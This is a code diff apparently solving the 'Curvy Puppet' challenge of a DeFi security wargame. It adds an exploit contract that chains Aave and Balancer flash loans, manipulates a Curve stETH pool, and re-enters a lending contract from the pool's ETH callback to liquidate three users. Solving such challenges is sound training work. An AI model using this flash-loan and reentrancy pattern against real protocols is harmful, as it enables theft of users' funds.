@@ -66,10 +66,7 @@ contract CurvyPuppetChallenge is Test {
 
         // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
         lending = new CurvyPuppetLending({
-            _collateralAsset: address(dvt),
-            _curvePool: curvePool,
-            _permit2: permit2,
-            _oracle: oracle
+            _collateralAsset: address(dvt), _curvePool: curvePool, _permit2: permit2, _oracle: oracle
         });
 
         // Fund treasury account with WETH and approve player's expenses
@@ -158,7 +155,24 @@ contract CurvyPuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
-        
+        IERC20 curveLpToken = IERC20(curvePool.lp_token());
+        CurvyPuppetExploit exploit = new CurvyPuppetExploit({
+            _curvePool: curvePool,
+            _lending: lending,
+            _curveLpToken: curveLpToken,
+            _stETH: stETH,
+            _weth: weth,
+            _dvt: dvt,
+            _treasury: treasury,
+            _alice: alice,
+            _bob: bob,
+            _charlie: charlie
+        });
+
+        curveLpToken.transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);
+        weth.transferFrom(treasury, address(exploit), TREASURY_WETH_BALANCE);
+
+        exploit.executeExploit();
     }
 
     /**
@@ -182,5 +196,147 @@ contract CurvyPuppetChallenge is Test {
         assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
         assertEq(weth.balanceOf(player), 0, "Player still has WETH");
         assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
+    }
+}
+
+interface IAaveFlashloan {
+    function flashLoan(
+        address receiverAddress,
+        address[] calldata assets,
+        uint256[] calldata amounts,
+        uint256[] calldata modes,
+        address onBehalfOf,
+        bytes calldata params,
+        uint16 referralCode
+    ) external;
+}
+
+interface IBalancerVault {
+    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
+        external;
+}
+
+contract CurvyPuppetExploit {
+    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
+    IAaveFlashloan constant AAVE_V2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
+    IBalancerVault constant BALANCER_VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+
+    IStableSwap public immutable curvePool;
+    CurvyPuppetLending public immutable lending;
+    IERC20 public immutable curveLpToken;
+    IERC20 public immutable stETH;
+    WETH public immutable weth;
+    DamnValuableToken public immutable dvt;
+    address public immutable treasury;
+    address public immutable alice;
+    address public immutable bob;
+    address public immutable charlie;
+
+    bool private liquidated;
+
+    constructor(
+        IStableSwap _curvePool,
+        CurvyPuppetLending _lending,
+        IERC20 _curveLpToken,
+        IERC20 _stETH,
+        WETH _weth,
+        DamnValuableToken _dvt,
+        address _treasury,
+        address _alice,
+        address _bob,
+        address _charlie
+    ) {
+        curvePool = _curvePool;
+        lending = _lending;
+        curveLpToken = _curveLpToken;
+        stETH = _stETH;
+        weth = _weth;
+        dvt = _dvt;
+        treasury = _treasury;
+        alice = _alice;
+        bob = _bob;
+        charlie = _charlie;
+    }
+
+    function executeExploit() external {
+        curveLpToken.approve(address(permit2), type(uint256).max);
+        permit2.approve({
+            token: address(curveLpToken),
+            spender: address(lending),
+            amount: type(uint160).max,
+            expiration: uint48(block.timestamp + 1 days)
+        });
+
+        stETH.approve(address(AAVE_V2), type(uint256).max);
+        weth.approve(address(AAVE_V2), type(uint256).max);
+
+        address[] memory assets = new address[](2);
+        assets[0] = address(stETH);
+        assets[1] = address(weth);
+
+        uint256[] memory amounts = new uint256[](2);
+        amounts[0] = 172_000 ether;
+        amounts[1] = 20_500 ether;
+
+        uint256[] memory modes = new uint256[](2);
+        modes[0] = 0;
+        modes[1] = 0;
+
+        AAVE_V2.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);
+
+        dvt.transfer(treasury, dvt.balanceOf(address(this)));
+        weth.transfer(treasury, weth.balanceOf(address(this)));
+        curveLpToken.transfer(treasury, curveLpToken.balanceOf(address(this)));
+        stETH.transfer(treasury, stETH.balanceOf(address(this)));
+    }
+
+    function executeOperation(
+        address[] memory,
+        uint256[] memory,
+        uint256[] memory,
+        address,
+        bytes memory
+    ) external returns (bool) {
+        require(msg.sender == address(AAVE_V2), "not aave");
+
+        address[] memory tokens = new address[](1);
+        tokens[0] = address(weth);
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = 37_991 ether;
+
+        BALANCER_VAULT.flashLoan(address(this), tokens, amounts, bytes(""));
+        return true;
+    }
+
+    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
+        require(msg.sender == address(BALANCER_VAULT), "not balancer");
+
+        weth.withdraw(58_685 ether);
+
+        stETH.approve(address(curvePool), type(uint256).max);
+        uint256[2] memory addAmounts;
+        addAmounts[0] = 58_685 ether;
+        addAmounts[1] = stETH.balanceOf(address(this));
+        curvePool.add_liquidity{value: 58_685 ether}(addAmounts, 0);
+
+        uint256[2] memory mins = [uint256(0), uint256(0)];
+        uint256 lpBalance = curveLpToken.balanceOf(address(this));
+        curvePool.remove_liquidity(lpBalance - 3 ether - 1, mins);
+
+        weth.deposit{value: 37_991 ether}();
+        weth.transfer(address(BALANCER_VAULT), 37_991 ether);
+
+        uint256 ethToStEth = 12_963.923469069977697655 ether;
+        curvePool.exchange{value: ethToStEth}(0, 1, ethToStEth, 1);
+        weth.deposit{value: 20_518 ether}();
+    }
+
+    receive() external payable {
+        if (msg.sender == address(curvePool) && !liquidated) {
+            liquidated = true;
+            lending.liquidate(alice);
+            lending.liquidate(bob);
+            lending.liquidate(charlie);
+        }
     }
 }
